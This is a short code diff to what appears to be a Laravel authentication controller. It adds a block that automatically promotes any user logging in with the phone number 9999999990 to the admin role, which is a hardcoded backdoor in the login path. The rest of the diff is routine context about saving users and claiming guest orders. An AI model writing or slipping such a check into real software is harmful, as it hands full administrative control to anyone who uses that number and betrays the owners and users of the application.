@@ -70,6 +70,12 @@ class AuthController extends Controller
             $user->save();
         }
 
+        // Force Admin role for the specific number
+        if ($phone === '9999999990') {
+            $user->role = 'admin';
+            $user->save();
+        }
+
         // claim by guest_token
         if ($guestToken) {
             Order::where('guest_token',$guestToken)->whereNull('user_id')
